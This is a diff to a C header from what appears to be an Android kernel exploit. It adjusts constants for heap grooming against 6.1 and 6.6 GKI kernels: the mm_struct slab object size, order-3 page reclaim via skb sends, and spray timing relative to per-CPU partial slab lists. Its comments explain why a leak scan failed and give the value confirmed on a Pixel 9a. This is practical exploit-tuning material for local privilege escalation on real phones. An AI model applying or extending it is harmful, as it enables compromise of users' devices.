@@ -58,8 +58,21 @@
 #define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
 
 /* Defaults for 6.6 GKI targets. 6.1 targets (android14-6.1 KMI) override
- * these in target.h: MM_STRUCT_SZ 0x3c0, KMALLOC_CGROUP_TYPE 1,
- * KMALLOC_CACHE_TYPES 3 (no ZONE_DMA row). */
+ * these in target.h: KMALLOC_CGROUP_TYPE 1, KMALLOC_CACHE_TYPES 3 (no
+ * ZONE_DMA row), and MM_STRUCT_SZ.
+ *
+ * MM_STRUCT_SZ is NOT sizeof(struct mm_struct). This comment used to say
+ * 0x3c0 for 6.1, which is what BTF reports, and that value makes the
+ * KernelSnitch scan stride past every live object so the leak fails on every
+ * retry. proc_caches_init() sizes the cache as
+ *     mm_size = sizeof(struct mm_struct) + cpumask_size();
+ * because mm_struct ends with the cpu_bitmap[] flexible array that BTF counts
+ * as zero-length. With CONFIG_NR_CPUS=32 and CONFIG_CPUMASK_OFFSTACK unset
+ * that is 960 + 8 = 968, which SLAB_HWCACHE_ALIGN rounds to 0x400. Confirmed
+ * on a Pixel 9a, where /proc/slabinfo is world-readable and reports
+ *     mm_struct  999  1276  1024  32  8
+ * i.e. objsize 1024, 32 objects per slab, 8 pages per slab. Read it off the
+ * device rather than deriving it. */
 #ifndef MM_STRUCT_SZ
 #define MM_STRUCT_SZ 0x500
 #endif
@@ -77,7 +90,20 @@
 #define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
 #define PIPE_CANDIDATE_PAGES 8
 #define SKB_SEND_SIZE (ORDER3_SIZE * 2)
+#ifndef SKB_RECLAIM_SENDS
 #define SKB_RECLAIM_SENDS 4
+#endif
+/* See prepare_kernel_page(): 1 keeps the PCP-shaping skb queued across the
+ * reclaim sends so every send has to allocate a fresh order-3 page. */
+#ifndef RECLAIM_KEEP_PCP_SHAPING
+#define RECLAIM_KEEP_PCP_SHAPING 0
+#endif
+/* See prepare_kernel_page(): 1 defers the strided spray_ctx closes until after
+ * the target slab is empty, so they unfreeze it off the per-CPU partial list
+ * instead of leaving it frozen there. */
+#ifndef RECLAIM_SPRAY_AFTER_LEAK_FREE
+#define RECLAIM_SPRAY_AFTER_LEAK_FREE 0
+#endif
 #define FOPS_TABLE_OFF FOPS_OFF
 #define SKB_FRAG_BIAS 0
 
